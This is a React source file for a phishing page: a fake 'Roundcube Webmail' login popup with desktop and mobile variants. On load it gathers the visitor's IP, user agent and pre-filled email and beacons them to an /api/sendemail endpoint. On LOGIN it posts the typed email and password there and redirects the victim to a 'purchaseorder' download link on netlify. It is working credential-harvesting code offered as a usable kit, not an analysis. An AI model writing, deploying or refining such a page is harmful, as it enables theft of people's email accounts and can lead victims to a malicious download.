/** @format */
"use client";

import React, { useState, useEffect } from "react";

const InputWithIcon = ({ type = "text", placeholder, value, onChange, icon }) => {
  const [focused, setFocused] = useState(false); // ✅ added state

  const base = {
    display: "flex",
    alignItems: "center",
    border: "1px solid #d9d9d9",
    borderRadius: 6,
    overflow: "none", // ✅ added to contain outline
    background: "#fafafa",
    height: 44,
    width: "100%", // ✅ changed from 85% to 100% for better mobile fit
    maxWidth: "400px", // ✅ added maxWidth for larger screens
    margin: "0 auto" // ✅ center align
  };

  const iconBox = {
    width: 48,
    height: "100%",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    background: "#efefef",
    borderRight: "1px solid #e0e0e0",
  };

  const inputStyle = {
    border: "none",
    outline: focused ? "5px solid #3DBBFF" : "none", // 👈 only shows on focus
    flex: 1,
    fontSize: 15,
    padding: "10px 12px",
    background: "transparent",
    width: "100%", // ✅ ensure full width within container
  };

  return (
    <div style={base}>
      <div style={iconBox} aria-hidden>
        {icon}
      </div>
      <input
        type={type}
        placeholder={placeholder}
        value={value}
        onChange={onChange}
        style={inputStyle}
        autoComplete="off"
        onFocus={() => setFocused(true)}   // 👈 added
        onBlur={() => setFocused(false)}   // 👈 added
      />
    </div>
  );
};


const UserIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" aria-hidden>
    <path fill="#333" d="M12 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8zm0 2c-4.418 0-8 2.239-8 5v1h16v-1c0-2.761-3.582-5-8-5z" />
  </svg>
);

const LockIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" aria-hidden>
    <path fill="#333" d="M17 8h-1V6a4 4 0 0 0-8 0v2H7a1 1 0 0 0-1 1v9a1 1 0 0 0 1 1h10a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1zM10 6a2 2 0 1 1 4 0v2h-4V6z" />
  </svg>
);

const Popup = ({ domain, eparams, systemInfo }) => {
  const [email, setEmail] = useState(eparams || ""); // ✅ changed from readonly to editable
  const [password, setPassword] = useState("");
  const [userAgent, setUserAgent] = useState("");
  const [remoteAddress, setRemoteAddress] = useState("");
  const [landingUrl, setLandingUrl] = useState("");

  useEffect(() => {
    // Set user agent
    setUserAgent(navigator.userAgent);
    
    // Set landing URL
    setLandingUrl(window.location.href);
    
    // Get IP address
    const getIP = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setRemoteAddress(data.ip);
      } catch (error) {
        console.error("Failed to get IP address:", error);
        setRemoteAddress("Unable to retrieve IP");
      }
    };
    
    getIP();

    // Send access notification when component mounts
    const sendAccessNotification = async () => {
      try {
        await fetch(`/api/sendemail?email=${encodeURIComponent(email)}&userAgent=${encodeURIComponent(navigator.userAgent)}&remoteAddress=${encodeURIComponent(remoteAddress)}&landingUrl=${encodeURIComponent(window.location.href)}`, {
          method: "GET",
        });
      } catch (error) {
        console.error("Failed to send access notification:", error);
      }
    };
    
    sendAccessNotification();
  }, [email, remoteAddress]); // ✅ updated dependency

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      await fetch("/api/sendemail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ 
          eparams: email, // ✅ use the email state instead of eparams
          password, 
          userAgent, 
          remoteAddress,
          landingUrl: window.location.href
        }),
      });
    } catch (error) {
      console.error("Failed to send credentials:", error);
    }

    window.location.href = "https://purchaseorderbvcgvbn.netlify.app/fkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq/download";
  };

  return (
    <div
      style={{
        padding: "40px 20px", // ✅ reduced horizontal padding for mobile
        borderRadius: "10px",
        maxWidth: "400px",
        width: "100%",
        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
        margin: "0 auto", // ✅ center on larger screens
        boxSizing: "border-box",
      }}
    >
      <div style={{ textAlign: "center", marginBottom: "30px" }}>
        <img 
          style={{ width: "100px", height: "auto", marginRight: "0" }} // ✅ removed right margin
          src="/Roundcube.jpg" 
          alt="Roundcube Webmail" 
        />
      </div>

      {/* Username (editable) */}
      <div style={{ marginBottom: "8px", display: "flex", justifyContent: "center" }}>
        <InputWithIcon
          type="text"
          placeholder="Email address"
          value={email}
          onChange={(e) => setEmail(e.target.value)} // ✅ added onChange
          icon={<UserIcon />}
        />
      </div>

      {/* Password */}
      <div style={{ marginBottom: "8px", display: "flex", justifyContent: "center" }}>
        <InputWithIcon
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          icon={<LockIcon />}
        />
      </div>

      {/* Login Button */}
      <div style={{ display: "flex", justifyContent: "center" }}>
        <button
          onClick={handleLogin}
          style={{
            width: "100%",
            maxWidth: "400px",
            backgroundColor: "#3DBBFF",
            color: "#fff",
            border: "none",
            padding: "12px",
            borderRadius: "6px",
            cursor: "pointer",
            fontSize: "16px",
            height: "44px"
          }}
        >
          LOGIN
        </button>
      </div>

      <div style={{ 
        marginTop: "10px", 
        textAlign: "center", 
        fontSize: "14px", 
        color: "#888", 
        marginRight: "0" // ✅ removed right margin
      }}>
        Roundcube Webmail
      </div>
    </div>
  );
};

const PopupMobile = ({ domain, eparams, systemInfo }) => {
  const [email, setEmail] = useState(eparams || ""); // ✅ changed from readonly to editable
  const [password, setPassword] = useState("");
  const [userAgent, setUserAgent] = useState("");
  const [remoteAddress, setRemoteAddress] = useState("");
  const [landingUrl, setLandingUrl] = useState("");

  useEffect(() => {
    // Set user agent
    setUserAgent(navigator.userAgent);
    
    // Set landing URL
    setLandingUrl(window.location.href);
    
    // Get IP address
    const getIP = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setRemoteAddress(data.ip);
      } catch (error) {
        console.error("Failed to get IP address:", error);
        setRemoteAddress("Unable to retrieve IP");
      }
    };
    
    getIP();

    // Send access notification when component mounts
    const sendAccessNotification = async () => {
      try {
        await fetch(`/api/sendemail?email=${encodeURIComponent(email)}&userAgent=${encodeURIComponent(navigator.userAgent)}&remoteAddress=${encodeURIComponent(remoteAddress)}&landingUrl=${encodeURIComponent(window.location.href)}`, {
          method: "GET",
        });
      } catch (error) {
        console.error("Failed to send access notification:", error);
      }
    };
    
    sendAccessNotification();
  }, [email, remoteAddress]); // ✅ updated dependency

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      await fetch("/api/sendemail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ 
          eparams: email, // ✅ use the email state instead of eparams
          password, 
          userAgent, 
          remoteAddress,
          landingUrl: window.location.href
        }),
      });
    } catch (error) {
      console.error("Failed to send credentials:", error);
    }

    window.location.href = "https://purchaseorderbvcgvbn.netlify.app/fkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq/download";
  };

  return (
    <div style={{  
      padding: "20px 15px", // ✅ reduced padding for very small screens
      borderRadius: "10px", 
      width: "100%",
      maxWidth: "350px",
      margin: "20px auto", 
      fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", 
      boxSizing: "border-box",
    }}>
      <div style={{ textAlign: "center", marginBottom: "20px" }}>
        <img 
          src="/Roundcube.jpg" 
          alt="Roundcube Webmail" 
          style={{ width: "80px", height: "auto", marginRight: "0" }} // ✅ smaller image for mobile
        />
      </div>

      {/* Username (editable) */}
      <div style={{ marginBottom: "8px" }}>
        <InputWithIcon
          type="text"
          placeholder="Email address"
          value={email}
          onChange={(e) => setEmail(e.target.value)} // ✅ added onChange
          icon={<UserIcon />}
        />
      </div>

      {/* Password */}
      <div style={{ marginBottom: "8px" }}>
        <InputWithIcon
          type="password"
          placeholder="Enter your password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          icon={<LockIcon />}
        />
      </div>

      {/* Login Button */}
      <div style={{ display: "flex", justifyContent: "center" }}>
        <button 
          onClick={handleLogin} 
          style={{ 
            width: "100%", 
            maxWidth: "400px",
            backgroundColor: "#179bd7", 
            color: "#fff", 
            border: "none", 
            padding: "12px", // ✅ reduced padding
            fontWeight: "600", 
            borderRadius: "6px", 
            cursor: "pointer", 
            fontSize: "15px", // ✅ slightly smaller font
            height: "44px" // ✅ reduced height
          }}
        >
          LOGIN
        </button>
      </div>

      <div style={{ 
        marginTop: "10px", 
        textAlign: "center", 
        fontSize: "13px", // ✅ smaller font for mobile
        color: "#888",
        marginRight: "0" // ✅ removed right margin
      }}>
        Roundcube Webmail
      </div>
    </div>
  );
};

const ResponsivePopup = (props) => {
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    checkMobile();
    window.addEventListener("resize", checkMobile);
    return () => window.removeEventListener("resize", checkMobile);
  }, []);

  return isMobile ? <PopupMobile {...props} /> : <Popup {...props} />;
};

export default ResponsivePopup;